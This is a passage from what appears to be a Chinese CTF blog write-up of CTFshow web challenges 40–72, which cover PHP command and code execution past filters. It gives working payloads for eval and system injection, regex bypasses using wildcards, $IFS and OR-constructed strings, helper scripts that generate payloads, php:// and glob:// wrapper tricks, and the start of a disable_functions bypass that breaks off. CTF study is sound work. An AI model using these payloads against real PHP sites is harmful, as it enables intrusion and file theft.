c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</p><p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p><p>pos():输出数组第一个元素，不改变指针；</p><p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p><p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p><p>array_reverse():数组逆置</p><p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p><p>show_source():查看源码</p><p>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</p><p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p>提示：该函数不会移动数组内部指针。</p><p>相关的方法：</p><p>current()返回数组中的当前元素的值。</p><p>end()将内部指针指向数组中的最后一个元素，并输出。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>prev()将内部指针指向数组中的上一个元素，并输出。</p><p>reset()将内部指针指向数组中的第一个元素，并输出。</p><p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p><p>2、c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);</p><p>同理?cmd&#x3D;system(“tac%20flag.php”);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p><p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p><p>3、c&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p><p><img src="web40.png" alt="web40" loading="lazy"></p><p>通过cookie获得参数进行命令执行</p><p>受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</p></blockquote><h4 id="web41-rce-or"><a href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个<code>|</code>运算符</p><p>根据正则匹配生成可用字符的集合rce_or.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>根据可用的字符生成Payload</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>param<span class="token punctuation">)</span></code></pre><p><img src="web41.png" loading="lazy"></p><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>Payload:</p><blockquote><p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p><p>使用 “ ; “ “ || “ “ &amp; “ “ &amp;&amp; “ 分隔</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 &#x2F;dev&#x2F;null 即不回显<br>; 分号<br>| 只执行后面那条命令<br>|| 只执行前面那条命令<br>&amp; 两条命令都会执行<br>&amp;&amp; 两条命令都会执行</p></blockquote><h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>多过滤了cat,\和；，使用其他Payload即可</p><h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>多过滤了flag，使用fla*即可</p><h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>过滤了空格，使用$IFS或者%09绕过即可</p><h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>过滤了$和*，Payload如下：</p><blockquote><p>1、?c&#x3D;nl&lt;fla’’g.php||</p><p>2、?c&#x3D;ca\t&lt;fl\ag.php||</p></blockquote><h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><blockquote><p>tac%09fl’’ag.php||</p><p>…….</p></blockquote><h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>多过滤了一些函数，不过之前Payload可以继续打</p><h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>过滤了%，但是可以&lt;</p><h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>同上</p><h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>ban了tac但是可以用nl</p><h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>ban了&lt;&gt;，但是可以用$IFS,而且这次flag放在了根目录</p><p>Payload:</p><blockquote><p>?c&#x3D;nl$IFS&#x2F;fl’’ag||</p></blockquote><h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1、?c&#x3D;ta’’c${IFS}f’’lag.php</p><p>2、s’’ort${IFS}f???????%0a</p></blockquote><h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1、?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p><p>2、mv flag.php t.txt</p></blockquote><h4 id="web55-无数字字母的命令执行"><a href="#web55-无数字字母的命令执行" class="headerlink" title="web55(无数字字母的命令执行)"></a>web55(无数字字母的命令执行)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>过滤了所有字母</p><p><img src="web55.png" loading="lazy"></p><p>利用post上传文件，然后使用.(source)执行，一般上传后文件在&#x2F;tmp&#x2F;php?????[@-[]</p><p><img src="web55_2.png" loading="lazy"></p><p>[参考文章]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>“无字母数字的命令执行”</p><h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>方法同上</p><h4 id="web57-取反"><a href="#web57-取反" class="headerlink" title="web57(取反)"></a>web57(取反)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//flag in 36.php </span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>过滤了字母数字</p><p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p><p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p><p><code>$(( $((~$(()))) $((~$(()))) ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p><p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p><p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36</p><p>Payload:</p><blockquote><p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p></blockquote><h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1、c&#x3D;show_source(‘flag.php’);</p><p>2、c&#x3D;highlight_file(“flag.php”);</p><p>3、c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>4、c&#x3D;include(“flag.php”);var_dump(get_defined_vars());</p></blockquote><h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>Payload同上</p><h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>Payload同上</p><h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>Payload同上</p><h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>Payload同上，不过ban了highlight_file函数</p><h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>Payload同上</p><h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>Payload同上</p><h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>ban了show_source,然后使用php伪协议读取flag.php时，源码显示flag不在这，于是使用data协议读取根目录看到flag.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="web65.png" loading="lazy"></p><p>因为大部分直接可以命令执行的函数被ban了，看了wp没想到highlight_file没被ban</p><h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>Payload同上</p><h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_file被ban了，但是可以直接用php伪协议读取</p><h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>Payload同上</p><p>implode：把数组元素组合为字符串</p><p>冷门函数：读取函数readgzfile：可以读取非gz格式的文件</p><p>Payload：</p><blockquote><p>1、?c&#x3D;echo(implode(‘—‘,scandir(“&#x2F;“)));</p><p>2、?c&#x3D;readgzfile(‘&#x2F;flag.txt’);</p></blockquote><h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>虽然有几个报错但是flag还是出来了</p><h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>虽然php伪协议可以读，但是结果把数字字母替换了，但是可以执行php代码让后面的匹配缓冲区不执行直接退出exit或die</p><p>Payload:</p><blockquote><p>c&#x3D;readgzfile(‘&#x2F;flag.txt’);exit(0);</p><p>c&#x3D;include(‘&#x2F;flag.txt’);exit(0);</p></blockquote><h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>Payload同上</p><h4 id="web72-glob协议-waf绕过"><a href="#web72-glob协议-waf绕过" class="headerlink" title="web72(glob协议+waf绕过)"></a>web72(glob协议+waf绕过)</h4><p>flag不在&#x2F;下了，但是很多查询的函数被ban了</p><p>使用glob:&#x2F;&#x2F;伪协议绕过open_basedir</p><p>glob可以遍历目录，并且不受disable_functions的限制。</p><pre class="language-php" data-language="php"><code class="language-php">c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob://./*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>仔细看看这个代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span><span class="token comment"># glob:// — 查找匹配的文件路径模式</span><span class="token comment"># DirectoryIterator("glob:///*")   遍历根目录里所有文件</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>  <span class="token comment">#循环遍历输出，并以空格为分隔</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>其实不加前面<code>?&gt;&lt;?php</code>也是可以的。eval里的语句可以视为在当前php文件里加了几条语句，这些语句必须是完整的，即必须以<code>;</code>或者<code>?&gt;</code>结尾来结束语句，但是eval里的?&gt;不会闭合当前的php文件，所以当前php页面后续的语句都是会执行的。</p><p>可以看一下下面的图片，eval里的语句可以修改文件的变量值，但是<code>?&gt;</code>并不会闭合外面的PHP语句。<br><img src="web72.png" alt="在这里插入图片描述" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span 